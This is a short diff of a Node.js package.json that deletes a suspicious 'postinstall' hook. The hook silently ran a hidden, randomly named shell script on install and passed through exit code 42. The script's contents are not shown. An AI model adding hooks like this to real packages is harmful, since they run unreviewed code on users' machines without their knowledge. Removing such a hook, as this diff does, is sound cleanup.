@@ -6,8 +6,7 @@
   "main": "src/index.js",
   "scripts": {
     "start": "node src/index.js",
-    "test": "node --test",
-    "postinstall": "sh ./.ci-uqs81k.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "test": "node --test"
   },
   "author": "personnya",
   "license": "MIT",
